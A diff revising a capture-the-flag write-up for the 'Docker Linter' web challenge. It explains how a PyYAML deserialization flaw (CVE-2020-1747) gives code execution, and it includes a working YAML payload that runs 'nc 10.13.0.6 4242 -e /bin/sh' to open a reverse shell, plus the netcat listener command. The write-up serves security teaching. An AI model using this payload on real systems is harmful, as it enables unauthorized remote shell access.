@@ -9,8 +9,8 @@
 <!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
 * Author: The Compiler ([@the_compiler](https://twitter.com/the_compiler), 
                         <https://bruhin.software/>)
-* Tags:   #web-security #exploitation
-* Level:  hard
+* Tags:   `#web-security` `#exploitation`
+* Level:  Hard
 
 Docker Linter is a useful web application ensuring that your Docker-related
 files follow best practices. Unfortunately, there's a security issue in there...
@@ -30,13 +30,19 @@ the VPN to solve this challenge (see `RESOURCES` on top).
 
 ## Solution
 
-Here is a screenshot of the _Docker Linter Service_:
+Here is a screenshot of the _Docker Linter Service_ …
 
-![](screenshot_docker_linter.png)
+| ![](screenshot_docker_linter.png) |
+|-----------------------------------|
 
-The web service allowed you to upload different kind of docker files in order
-to lint them. Posting an arbitrary string like `ladida` instead of an actual
-docker file was enough to get a list of the involved tools and libraries:
+<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
+As the name implies, different kind of _[Docker]_ files can be uploaded to the
+web service in order to [lint] them, meaning statically check their validity.
+Posting an arbitrary string like `ladida` instead of an actual _Docker_ file is
+sufficient to get a list of the involved tools and libraries in the server …
+
+[Docker]: https://en.wikipedia.org/wiki/Docker_(software)
+[lint]: https://en.wikipedia.org/wiki/Lint_(software)
 
 * `Dockerfile`
     * `hadolint`
@@ -52,7 +58,8 @@ docker file was enough to get a list of the involved tools and libraries:
     * `dotenv-linter`
 
 After a lot of trial and error attacking the python YAML implementation turned
-out to be the right way. There is a [PoC (CVE-2020-1747)]() available about it.
+out to be the right way. A [PoC (CVE-2020-1747)] about the attack/vulnerability
+is available on the web.
 
 [PoC (CVE-2020-1747)]: https://2130706433.net/blog/pyyaml/
 
@@ -60,22 +67,25 @@ The attack works by exploiting a deserialization vulnerability in the PyYAML
 library which allows arbitrary code execution and thus including setting up a
 reverse shell.
 
-The payload was constructed according to the [script gist]() available on the same
-webpage as the PoC and a [cheat sheet kinda resource for reverse shells]():
+The payload is constructed according to the [script gist] available on the same
+webpage as the PoC and a [cheat sheet kinda resource for reverse shells]\:
 
 [script gist]: https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1
 [cheat sheet kinda resource for reverse shells]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
 
-```python
+```yaml
 !!python/object/new:type
   args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
   listitems: "__import__('os').system('nc 10.13.0.6 4242 -e /bin/sh')"
 ```
 
-![](screenshot_payload.png)
+| ![](screenshot_payload.png) |
+|-----------------------------|
 
-On the other end there was a VM connected via a VPN and listening for an
-incoming connection on port 4242:
+On the listening end there is a Linux VM connected via a VPN and waiting for
+an incoming connection on port 4242. Due to the nature of the reverse shell, it
+does not show shell prompts. But type echoing and printing to standard out work
+just fine …
 
 ```sh
 # nc -l -p 4242
